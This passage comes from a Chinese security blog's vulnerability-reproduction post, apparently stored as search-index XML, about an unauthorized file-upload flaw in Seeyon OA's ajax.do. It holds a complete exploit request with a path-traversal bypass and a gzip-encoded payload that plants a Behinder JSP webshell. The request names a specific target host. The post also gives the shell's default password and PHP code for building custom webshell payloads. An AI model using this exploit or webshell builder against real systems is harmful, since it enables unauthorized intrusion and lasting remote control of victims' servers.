-<p><code>POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip HTTP/1.1 Host: oatest.dptech.com:81 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 3485</code></p>
-<p><code>managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%0AuTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28%2A%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%C2%9D%C2%9D%C2%87%C3%B6%C2%A8%1F%C2%A6I%C3%99y%C3%B8%09%C3%8B%C3%9C%5DH%03%0F%C3%A3%C3%9A%C2%87%C2%9D%C2%98%C3%9C%C3%80%2C%C2%A9%5Cn%C3%8CJ%C3%8B+sE%C3%A1%C2%B6%25%C2%B5%C2%8CE%C3%8ERe%C3%81%2C.%C3%96%5C%12%402%C3%8F%01%C2%AF%C3%A7k%C2%A2%14%C2%AE6%C2%96%C2%8F%C2%83%C2%97%C3%A2%28.%22%5B%C2%93%7CH%C3%B4%0Ap%C2%B8pC%16m%C2%B4a%25%C2%85%C3%83g%27R%C2%AE%5B%C2%A2%26%C2%80%C3%A8%21%141gk%C3%82%C3%952+%C2%96D%C2%9C%01q%5C%C3%81%1A%C2%9F%2C8K%13%06%C3%B4%3D%5D%C2%A38mx%C3%93%C3%8F-%7E%25%C2%80%C2%A5Z%7C%2A%C2%A3%C2%B8%C2%B6%C2%B1%C3%89e%24%15%C2%BB%C2%B0%C3%BC%07%C3%B0%2F%C3%9FlQ%0F%5DqQY%C2%A6%C2%9A%C2%B8%C3%9C%C3%B0Q%12%C2%95%C3%942%C2%95%C2%9B%C2%B48%C3%BA%C2%B6%19%C2%B0%C2%B6%21%C2%9CA5%C2%99Q%C2%9D%1B%60%C3%8B%C3%822T%0C%C2%A2L%C2%97%C3%A7%C2%AD%C3%9EA%1C%07%14%C2%A3%C2%92%C3%84M%C3%A2%C3%B1%C3%8A%00PZ%C2%A6%C3%B4%C2%96%1F%5C%C2%A1%C2%B1J%1Dc%C3%A3%C3%AF%C2%B92%00%C3%BC%C3%86%C2%B7%C2%AB%00y%C2%A6%C2%8A%C2%A5E%06-%C2%84G4%3E%16%C2%9A%C2%AB%5CZ%C2%B6vk%C2%A2b%C2%9B%C3%A0%C3%9C%3E%C2%B6%C3%98%C2%B2%28%C2%A5%C2%9Bi%C2%89%C3%96%C2%A4%C3%84.%C2%81%C2%AC3%3D%C2%8FN%26%C3%BBLsZ%C3%A7%C3%BDl%1B%C2%B5%C3%9E%2A%C2%A09%C2%A0%C3%B9%C2%BB%C3%A7-RB%40%C3%B0%15%C2%8A%25%C2%863%C3%A1%00%C2%97%C2%AB%C3%84%25%C3%80wn%2C%C2%B2%0F%C3%BB%C2%81%7D%C3%98T%5B%C3%83%C3%86V%C2%A8%C2%9F%C2%B7%07i%60%21i%048%C3%BD%C3%96%C3%94%00%09Wh%C2%AA%C2%86e%C2%94%03%5B%C3%B3%11%C3%94%C2%A4%C3%94%C2%A9%C3%8E%C2%A3%3D%C2%87%C2%AFN%1B%C3%A3%C3%B8%C2%8D%5E%13%C2%88%C3%A1%1C%C3%93%C2%BA%C2%AA%C2%81K%14%2COW%13U%C3%9F+%C3%B9%C2%90%C2%85k%1A%C2%83c%C3%AE%C3%A3%0D%2As%C3%9B%04%C3%BE%C2%91%C3%93%C3%83%3AV%C2%8D%C3%93%C2%85%23%3F%C3%81V%C3%A5%C3%87%1F%C3%BE%C2%8C%C3%AC_%C3%BFL%C3%A4JB%C2%B2%C3%96%C3%88%C2%A7u%C2%BE%40%C3%A5%27%C3%AB7%7C%C3%AD%3Cr%C2%89%C3%8E%C3%93%C3%BA%C3%84P%0C%12P5zm%7Dj%C2%BD%C3%86%C2%AF_k%23O%C3%8FT%0Eb%C2%AB%12%C3%8E.k%C3%93%7C%2CRY%140%C2%AC%267h%0Cs%C3%97%C3%807%C3%BA6%C3%9D%C3%AB%C3%8AB%09%C3%959%C3%8Dkq%C2%B7%C3%8B%C2%9B%C3%BE%C3%A0T%C2%BC%C2%8Ftb%C3%93%5E%C2%95%C2%97%2B%0CL%1D%03%7E%C2%9F%C3%9B%C2%9C%C3%8E%1E%C2%89%C3%BE%C3%B6G%0Ej%C2%9AN%C2%ADK%C2%8E1%C3%B53%C2%A11%C3%90%C3%B8%C3%A1%C3%8A%C2%8D%14%C3%962%C2%84%C2%90%C3%86G%C3%BD%C3%90Kh%2CRP%05MO%C3%AF%C2%B9q%0EE%7D%08imw%C3%93q%C3%93%C2%93%C2%80S%2A%C3%87%C2%9C%C2%B0%C2%AE%C2%A8%C2%B3%C2%BB%C3%B0Z%C2%B4u%5D%15.%C2%BF%7F%7C%C2%9Fr%26%C3%8D%C2%A3%3EA%29%C3%A8O%5E%C2%B4%C3%B9%C2%B7%C3%A1%C3%8C%031%C2%A4%C2%83%0E%C3%AFw%3B%C3%A3%C2%9F%2B%C3%B5%C3%BE%3B%C3%95%C2%AD%C3%99%C2%9Dim%5B%C2%A6w%07%C3%AC%C2%B7%C3%B7%24%3F%C2%9D%28%40%C2%B3%04%1E%C2%BEt%C2%8E%C2%87%C3%85%C3%97%C3%A7%C2%8FK%C3%A2%C3%A3%C2%9E%C3%A97%0C%C2%8Ez%1F%C3%81%C3%BFO%17%C3%A08%C3%B5%C2%A8c%3F%C2%BE%C3%97%7B%C2%90%12%C3%90%3B1i%C3%A6d%080eY%C3%B6%1E%5E%C2%BB%3F%C3%A8r%C2%A4%0B%C3%B2%C2%B5%C2%BE%C2%B3K%C3%AEu%C3%BF%C3%BE%17%1CR%C2%AD%17W%05%00%00</code></p>
-<p>成功的话会返回：</p>
-<p><img src="/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20210113093745161.png" alt="image-20210113093745161"></p>
-<p>冰蝎连接：默认密码：rebeyond</p>
-<p><img src="/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20210113092857670.png" alt="image-20210113092857670"></p>
-<h5 id="特殊："><a href="#特殊：" class="headerlink" title="特殊："></a>特殊：</h5><p>漏洞的原理很简单，感觉学到的是关于冰蝎这个poc的生成：</p>
-<p>将冰蝎3默认的jsp的shell先做了base64的加密，然后做gzip数据的压缩</p>
-<p>gzdecode — Decodes a gzip compressed string，解压一个使用 gzip 压缩的字符串</p>
-<p><img src="/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20210113100709420.png" alt="image-20210113100709420"></p>
-<p>最后进行了 url编码</p>
-<p>可以自定义：</p>
-<p><code>$webshell = str_replace(&quot;../webapps/seeyon/&quot;,&quot;../webapps/seeyon/&quot;,$webshell); $webshell = str_replace(&quot;PeiQi.jspx&quot;,&quot;PeiQi.jspx&quot;,$webshell); $webshell = str_replace(&quot;e45e329feb5d925b&quot;,&quot;e45e329feb5d925b&quot;,$webshell);</code></p>
-<p><code>$webshell = gzencode($webshell); $webshell = iconv(&quot;ISO-8859-1&quot;,&quot;UTF-8&quot; ,$webshell); $webshell = urlencode(&quot;$webshell&quot;);</code></p>
-<p>（然后关注了一下清水川崎师傅</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>seeyon OA</tag>
       </tags>
   </entry>
 </search>
